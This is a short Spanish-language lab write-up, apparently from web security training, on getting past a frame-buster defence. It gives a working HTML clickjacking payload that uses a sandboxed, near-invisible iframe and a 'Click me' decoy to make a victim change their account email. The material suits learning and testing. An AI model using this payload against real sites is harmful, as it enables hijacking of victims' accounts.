# Clickjacking con script anti-frame 

Tags: #Clickjacking

```bash 
Este lab introduce una protección habitual contra ataques de clickjacking conocida como frame buster. Se trata de un script que impide que la página objetivo sea cargada dentro de un iframe, bloqueando así la superposición de contenidos engañosos. Sin embargo, el ataque sigue siendo posible si se neutraliza adecuadamente este mecanismo.


- frame buster o framekiller: Es un mecanismo de defensa utilizado para mitigar los ataques de clickjacking.  
- iframe sandbox: Brinda justo lo que se necesita para endurecer las restricciones sobre el contenido enmarcado. Se puede indicar al navegador que cargue el contenido de un marco especifico en un entorno con pocos privilegios, permitiendo solo el subconjunto de capacidades para realizar el trabajo necesario

Notas:
	1. Este lab solo funciona con Edge 
```

```html 
# Usar una politica que impida interpretar JavaScript dentro del mismo 'iframe' 

<style>
iframe{
width: 500px;
height: 600px;
opacity: 0.001;       
}

div{
position: absolute;
top: 450px;
left: 100px;
}
</style>

<div>Click me</div>
<iframe sandbox="allow-forms" src="https://web.com/my-account?email=hacked@hacked.com"></iframe>


Notas:
	1. En el sandbox se esta indicando que lo único que se quiere hacer es trabajar con formularios 
```